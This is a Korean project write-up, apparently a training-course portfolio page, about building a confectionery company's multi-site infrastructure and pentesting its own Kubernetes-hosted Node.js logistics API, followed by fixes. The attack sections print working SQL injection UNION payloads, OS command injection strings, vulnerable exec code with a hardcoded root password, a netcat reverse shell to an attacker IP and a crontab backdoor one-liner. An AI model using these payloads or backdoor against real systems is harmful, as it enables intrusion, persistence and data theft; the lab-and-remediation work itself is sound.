@@ -1,0 +1,187 @@
+## 프로젝트 개요
+
+지니제과의 전사 IT 인프라를 직접 구축하고, 거기서 끝내지 않고 Kali Linux로 모의해킹까지 진행한 다음 발견한 취약점을 조치한 프로젝트입니다. 강원도 본사와 서울·인천·부산 지사, AWS 클라우드가 ISP로 묶인 멀티사이트 환경이고, 그중 인천 지사의 물류 추적 서비스는 Kubernetes 위에 Node.js(Express) 백엔드와 MariaDB, nginx를 올려 구성했습니다. 모의해킹은 이 인천 지사 서비스(1.0.3.8:3000)를 대상으로 진행했습니다.
+
+| 항목 | 내용 |
+|---|---|
+| 분야 | 인프라 구축 / 모의해킹 / 취약점 조치 |
+| 주관기관 | 한국정보교육원 |
+| 개발 형태 | 팀 프로젝트 |
+| 진단 환경 | Kali Linux (curl, gobuster, netcat) |
+| 대상 서비스 | 인천 지사 물류 추적 API (Node.js + Express + MariaDB, Kubernetes) |
+
+---
+
+## 인프라 구성
+
+![지니제과 전체 인프라 구성도](/images/projects/genie-architecture.png)
+
+본사와 세 지사는 ISP를 거쳐 연결되고, 각 거점은 인터넷 접점마다 UTM과 WAF를 지나도록 했습니다. AWS는 서울 리전(ap-northeast-2)에 GJ-VPC01(웹·Auto Scaling)과 GJ-VPC02(RDS 전용)를 피어링으로 나눠 두었습니다.
+
+![인천 지사 구성도](/images/projects/genie-incheon.png)
+
+이번 진단 대상인 인천 지사는 컨테이너 기반으로 꾸몄습니다. DMZ에 Kubernetes 클러스터(Master IC-svr-01, Node IC-svr-02·03)를 두고 그 앞단에 HAProxy(GW-HAP-03)를 붙였습니다. 웹은 NodePort 서비스와 DaemonSet으로, DB는 NodePort 서비스와 ReplicaSet으로 배포했고, 데이터는 MariaDB(ic_logistics_db)에 저장했습니다. 정적 파일은 nginx로 서빙하고, 백엔드는 Node.js Express 서버(server.js, 3000번 포트)가 처리합니다. DB는 클러스터 안에서 ic-mariadb-service라는 서비스 이름으로 접근합니다.
+
+---
+
+## 모의해킹 1 - SQL Injection
+
+물류 송장을 조회하는 /api/track 엔드포인트를 대상으로 진행했습니다.
+
+### 인프라 정찰
+
+먼저 응답 헤더부터 확인했습니다. X-Powered-By 헤더에서 Express가 돌고 있다는 걸 알 수 있었습니다.
+
+```bash
+curl -I http://1.0.3.8:3000/
+# HTTP/1.1 200 OK
+# X-Powered-By: Express
+
+curl -I http://1.0.3.8:3000/api/track
+# HTTP/1.1 200 OK   → /api/track 가 살아있음을 확인
+```
+
+gobuster로 숨은 경로도 훑어봤습니다. index.html 외에 백엔드 경로가 외부로 노출돼 있었습니다.
+
+```bash
+gobuster dir -u http://1.0.3.8:3000/ -w /usr/share/wordlists/dirb/common.txt
+# index.html   (Status: 200) [Size: 10131]
+```
+
+### 파라미터 퍼징
+
+invoiceNum 파라미터에 작은따옴표를 하나 넣어보니 서버가 read ECONNRESET으로 비정상 반응을 했습니다. 입력값이 쿼리문에 그대로 섞여 들어간다는 신호였습니다.
+
+```bash
+curl "http://1.0.3.8:3000/api/track?invoiceNum=1"
+# {"logs":[]}
+```
+
+### 쿼리 구조 파악
+
+ORDER BY로 컬럼 개수를 셌습니다. 따옴표가 들어간 평문 요청은 curl 단에서 막혀서, 공백과 주석을 URL 인코딩해 우회했습니다.
+
+```bash
+# 1' ORDER BY 1 --   → curl: (3) URL rejected: Malformed input
+curl "http://1.0.3.8:3000/api/track?invoiceNum=1'%20ORDER%20BY%201%20%23"   # 성공
+# ...
+# invoiceNum=1'%20ORDER%20BY%206%20%23
+# {"error":"Unknown column '6' in 'ORDER BY'"}   → 컬럼은 정확히 5개
+```
+
+### 스키마 탈취
+
+컬럼 수를 알았으니 UNION SELECT로 DB 정보를 끌어냈습니다.
+
+```bash
+# 시스템 정보
+?invoiceNum=-1'%20UNION%20SELECT%201,database(),user(),@@version,5%20%23
+# → ic_logistics_db / root@10.233.97.128 / 10.11.18-MariaDB-ubu2204
+
+# 테이블 이름
+... FROM information_schema.tables WHERE table_schema='ic_logistics_db'
+# → invoices, tracking_logs
+
+# invoices 컬럼
+... FROM information_schema.columns WHERE table_name='invoices'
+# → invoice_num, sender, receiver
+```
+
+DB가 root 권한으로 돌고 있었고, invoices 테이블이 송장번호·발송지·수신자로 구성돼 있다는 설계까지 그대로 드러났습니다.
+
+### 데이터 덤프
+
+마지막으로 송장 데이터를 한 번에 뽑았습니다.
+
+```bash
+?invoiceNum=1'%20UNION%20SELECT%201,group_concat(invoice_num,':',sender,':',receiver),3,4,5%20FROM%20invoices%20%23
+# GENIE-11111-01:지니제과 본사:박지성, GENIE-12345-01:지니제과 본사:김빵빵,
+# GENIE-12345-02:지니제과 신림점:문땡땡, ... 전체 송장/발송지/수신자
+```
+
+요청 한 번으로 지니제과의 모든 송장 번호와 발송지, 수신자 정보가 그대로 빠져나왔습니다.
+
+---
+
+## 모의해킹 2 - OS Command Injection
+
+디버그용으로 열려 있던 /api/debug/ping 엔드포인트가 ip 파라미터를 명령어에 그대로 붙여 실행하고 있었습니다.
+
+```bash
+curl "http://1.0.3.8:3000/api/debug/ping?ip=127.0.0.1;id"
+# uid=0(root) gid=0(root) groups=0(root),...   → root 권한으로 명령 실행
+```
+
+세미콜론 뒤에 명령을 이어 붙여 파일 시스템을 둘러봤습니다.
+
+```bash
+...?ip=127.0.0.1;ls%20-al
+# server.js, IC-DB.yml, IC-PV.yml, IC-WEB.yml, package.json, node_modules, public ...
+```
+
+server.js를 그대로 읽어보니 DB 접속 정보가 평문으로 박혀 있었습니다. 그리고 취약점의 원인도 여기서 바로 드러났습니다. ip 파라미터를 검증 없이 exec에 넣고 있었던 겁니다.
+
+```js
+const connection = mysql.createConnection({
+  host: process.env.DB_HOST || 'ic-mariadb-service',
+  user: 'root',
+  password: process.env.MARIADB_ROOT_PASSWORD || 'IncheonPass2026!',
+  database: 'ic_logistics_db'
+});
+
+app.get('/api/debug/ping', (req, res) => {
+  const { ip } = req.query;
+  exec(`ping -c 1 ${ip}`, (error, stdout, stderr) => {   // ip가 그대로 셸로 전달
+    if (error) return res.send(`Error: ${stderr}`);
+    res.send(`Result: ${stdout}`);
+  });
+});
+```
+
+권한과 시스템 정보도 추가로 확인했습니다. /etc/passwd에서 root 계정이 /bin/sh를 쓸 수 있다는 것까지 보였습니다.
+
+```bash
+...?ip=127.0.0.1;whoami          # root
+...?ip=127.0.0.1;cat%20/etc/passwd
+# root:x:0:0:root:/root:/bin/sh ...
+```
+
+---
+
+## 리버스 쉘과 백도어
+
+여기까지 되면 사실상 서버를 통째로 잡을 수 있습니다. netcat으로 리버스 쉘을 받아봤습니다.
+
+```bash
+# 공격자 쪽: nc -lvnp 9001
+curl "http://1.0.3.8:3000/api/debug/ping?ip=127.0.0.1;nc%20192.168.5.200%209001%20-e%20/bin/sh"
+# connect to [192.168.5.200] from (UNKNOWN) [1.0.3.8] ...   → 쉘 획득
+```
+
+지속성까지 확인하려고 crontab에 백도어를 심을 수 있는지도 봤습니다. 아래 한 줄이면 매 분마다 리버스 쉘이 자동으로 다시 연결됩니다.
+
+```bash
+echo "* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.5.200 9001 >/tmp/f" >> /etc/crontab
+```
+
+웹 취약점 하나에서 시작해 root 셸과 영구적인 백도어까지 이어진다는 걸 직접 확인한 셈입니다.
+
+---
+
+## 취약점 조치
+
+찾아낸 문제는 코드와 설정 수준에서 하나씩 막았습니다.
+
+SQL Injection은 사용자 입력을 쿼리에 직접 이어 붙이던 부분을 파라미터 바인딩(Prepared Statement)으로 바꿔 해결했습니다. 입력값 형식 검증을 추가하고, DB 에러 메시지가 응답에 그대로 노출되지 않게 했습니다. DB 계정도 root 대신 조회에 필요한 권한만 가진 전용 계정으로 분리했습니다.
+
+OS Command Injection은 입력을 셸에 통째로 넘기던 exec를, 명령과 인자를 분리해 실행하는 방식(execFile)으로 교체했습니다. ip 값은 정해진 형식을 통과한 것만 받도록 했고, 운영 환경에서는 /api/debug 같은 디버그 엔드포인트 자체를 빼버렸습니다.
+
+server.js에 평문으로 들어가 있던 DB 비밀번호는 코드에서 걷어내고 환경변수와 쿠버네티스 시크릿으로 옮겼습니다. 컨테이너도 root가 아니라 일반 사용자로 뜨도록 바꾸고, 불필요한 아웃바운드 연결을 막고 /etc/crontab 변경을 감시하도록 해서 백도어가 심기기 어렵게 했습니다.
+
+조치 후에는 같은 페이로드로 다시 점검해서, 더 이상 통하지 않는 것까지 확인했습니다.
+
+---
+
+## 정리
+
+인프라를 Kubernetes·MariaDB·nginx로 직접 세우고, 그 위에서 실제 공격자가 밟을 법한 순서대로 정찰부터 데이터 덤프, 원격 명령 실행, 리버스 쉘까지 재현한 다음, 찾은 구멍을 코드와 설정에서 막는 데까지 해본 프로젝트였습니다. 공격과 방어를 한 번에 겪으면서, 사용자 입력을 믿으면 어디까지 무너지는지를 가장 확실하게 체감할 수 있었습니다.
